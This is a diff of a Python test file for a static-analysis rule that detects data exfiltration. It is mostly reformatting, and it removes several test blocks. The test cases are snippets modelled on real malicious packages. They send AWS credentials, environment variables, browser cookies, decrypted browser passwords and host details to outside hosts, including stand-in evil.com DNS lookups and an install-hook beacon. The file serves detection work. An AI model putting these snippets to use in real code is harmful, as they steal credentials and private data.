@@ -1,27 +1,23 @@
-"""Tests for post-systeminfo rule
+""" Tests for post-systeminfo rule
 
-OK cases:
-  - sending non-sensitive information
-  - using system information without sending
-RULEID cases:
-  - AWS credentials
-  - malware
-    - distrib
-    - tenserflow
-    - python-mysql
-    - mybiubiubiu
-    - ctx
+    OK cases:
+      - sending non-sensitive information
+      - using system information without sending
+    RULEID cases:
+      - AWS credentials
+      - malware
+        - distrib
+        - tenserflow
+        - python-mysql
+        - mybiubiubiu
+        - ctx
 """
+
 
 """ OK: sending non-sensitive information
 """
 sender = RequestSender()
-rest_request = RESTRequest(
-    "POST",
-    "http://localhost/test",
-    headers={"Test-Header": "1234"},
-    body='{"test": "value"}',
-)
+rest_request = RESTRequest("POST", "http://localhost/test", headers={"Test-Header": "1234"}, body='{"test": "value"}')
 # ok: exfiltrate-sensitive-data
 sender.send(rest_request)
 
@@ -54,25 +50,17 @@ with open("/root/.aws/credentials") as f:
     # ruleid: exfiltrate-sensitive-data
     requests.post("http://1.1.1.1", data={"creds": f.read()})
 
-creds = base64.b64decode(
-    os.getenv("AWS_ACCESS_KEY_ID") + "/" + os.getenv("AWS_SECRET_ACCESS_KEY")
-)
+creds = base64.b64decode(os.getenv("AWS_ACCESS_KEY_ID") + "/" + os.getenv("AWS_SECRET_ACCESS_KEY"))
 # ruleid: exfiltrate-sensitive-data
 requests.get("http://1.1.1.1/" + creds)
 
 
 """ RULEID: distrib malware
 """
-info = (
-    socket.gethostname()
-    + " "
-    + " ".join(["%s=%s" % (k, v) for (k, v) in os.environ.items()])
-    + " "
-)
-info += [
-    (s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close())
-    for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]
-][0][1]
+info = socket.gethostname() + " " + " ".join(["%s=%s" % (k, v) for (k, v) in os.environ.items()]) + " "
+info += [(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][
+    0
+][1]
 posty = "paste="
 for i in xrange(0, len(info)):
     if info[i].isalnum():
@@ -142,13 +130,10 @@ def checkVersion():
         loc_lang = os.popen("echo $LANG")
         language = loc_lang.rea
     ip = [
-        (s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close())
-        for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]
+        (s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]
     ][0][1]
     package = "pysprak"
-    vid = (
-        user_name + "###" + hostname + "###" + os_version + "###" + ip + "###" + package
-    )
+    vid = user_name + "###" + hostname + "###" + os_version + "###" + ip + "###" + package
     if sys.version_info > (3, 0):
         from urllib import parse, request
 
@@ -159,9 +144,7 @@ def checkVersion():
         )
     elif sys.version_info < (3, 0):
         # ruleid: exfiltrate-sensitive-data
-        urllib.urlopen(
-            r"http://numipy.openvc.org/spark.php", "vid=" + base64.encodestring(vid)
-        )
+        urllib.urlopen(r"http://numipy.openvc.org/spark.php", "vid=" + base64.encodestring(vid))
 
 
 """ RULEID: mybiubiubiu
@@ -174,8 +157,7 @@ data = {
     "hostname": str(hostname),
     "ip": str(ip),
     "package": "mybiubiubiu",
-    "language": "Python %s.%s.%s"
-    % (sys.version_info.major, sys.version_info.minor, sys.version_info.micro),
+    "language": "Python %s.%s.%s" % (sys.version_info.major, sys.version_info.minor, sys.version_info.micro),
     "time": str(timenow),
     "submit": "Submit",
 }
@@ -188,13 +170,6 @@ req = urlrequest.Request(
     headers={"Content-Type": "application/json"},
 )
 req.read()
-
-
-def leak_env_vars():
-    env_vars = os.environ
-    url = "https://www.datadoghq.com/"
-    # ruleid: exfiltrate-sensitive-data
-    requests.post(url, json=dict(env_vars))
 
 
 """ RULEID: CTX
@@ -225,12 +200,7 @@ class Ctx(dict):
     def sendRequest(self):
         # todoruleid: exfiltrate-sensitive-data
         response = requests.get(
-            "https://anti-theft-web[.]herokuapp.com/hacked/"
-            + self.name
-            + "/"
-            + self.access
-            + "/"
-            + self.secret
+            "https://anti-theft-web[.]herokuapp.com/hacked/" + self.name + "/" + self.access + "/" + self.secret
         )
 
 
@@ -243,87 +213,3 @@ requests.get("foo", auth=(os.environ["GH_TOKEN"], "x-oauth-basic"))
 cookies = browser_cookie3.chrome(domain_name="google.com")
 # ruleid: exfiltrate-sensitive-data
 requests.post("https://1.1.1.1/steal-cookies", data=json.dumps(cookies))
-
-""" RULEID: HTTP requests sent to pentest domains
-"""
-
-
-class CustomInstall(install):
-    def run(self):
-        install.run(self)
-        hostname = socket.gethostname()
-        cwd = os.getcwd()
-        username = getpass.getuser()
-        ploads = {"hostname": hostname, "cwd": cwd, "username": username}
-        # ruleid: exfiltrate-sensitive-data
-        requests.get("https://eo6ksiuyau5e5x2.m.pipedream.net", params=ploads)
-
-
-""" RULEID: sqlite3 data exfiltration
-"""
-
-
-def steal_passwords2(self, name: str, path: str, profile: str):
-    path = "path"
-    if not os.path.isfile(path):
-        return
-    loginvault = self.random_dir_create()
-    copy2(path, loginvault)
-    conn = sqlite3.connect(loginvault)
-    cursor = conn.cursor()
-    with open(
-        os.path.join(self.dir, "Browsers", "All Passwords.txt"), "a", encoding="utf-8"
-    ) as f:
-        for res in cursor.execute(
-            "SELECT origin_url, username, password_value FROM logins"
-        ).fetchall():
-            url, username, password = res
-            password = self.dcrpt_val(password, self.masterkey)
-            if url != "":
-                params = {"url": url, "username": username, "password": password}
-                # ruleid: exfiltrate-sensitive-data
-                requests.get("https://example.com", params=params)
-    cursor.close()
-    conn.close()
-
-""" DNS exfiltration tests
-"""
-
-import socket
-aws_key = os.getenv('AWS_ACCESS_KEY_ID')
-# ruleid: exfiltrate-sensitive-data
-socket.gethostbyname(f"{aws_key}.evil.com")
-
-hostname = socket.gethostname()
-# ruleid: exfiltrate-sensitive-data
-socket.getaddrinfo(f"{hostname}.evil.com", 80)
-
-user = getpass.getuser()
-# ruleid: exfiltrate-sensitive-data
-socket.gethostbyname_ex(f"{user}.evil.com")
-
-import dns.resolver
-aws_secret = os.getenv('AWS_SECRET_ACCESS_KEY')
-# ruleid: exfiltrate-sensitive-data
-dns.resolver.query(f"{aws_secret}.evil.com", 'A')
-
-token = os.getenv('AWS_SESSION_TOKEN')
-# ruleid: exfiltrate-sensitive-data
-dns.resolver.resolve(f"{token}.evil.com", 'A')
-
-resolver = dns.resolver.Resolver()
-cwd = os.getcwd()
-# ruleid: exfiltrate-sensitive-data
-resolver.query(f"{cwd}.evil.com", 'A')
-
-resolver2 = dns.resolver.Resolver()
-env_data = os.environ
-# ruleid: exfiltrate-sensitive-data
-resolver2.resolve(f"{env_data}.evil.com", 'A')
-
-import aiodns
-async def exfil():
-    resolver = aiodns.DNSResolver()
-    hostname = socket.gethostname()
-    # ruleid: exfiltrate-sensitive-data
-    await resolver.query(f"{hostname}.evil.com", 'A')
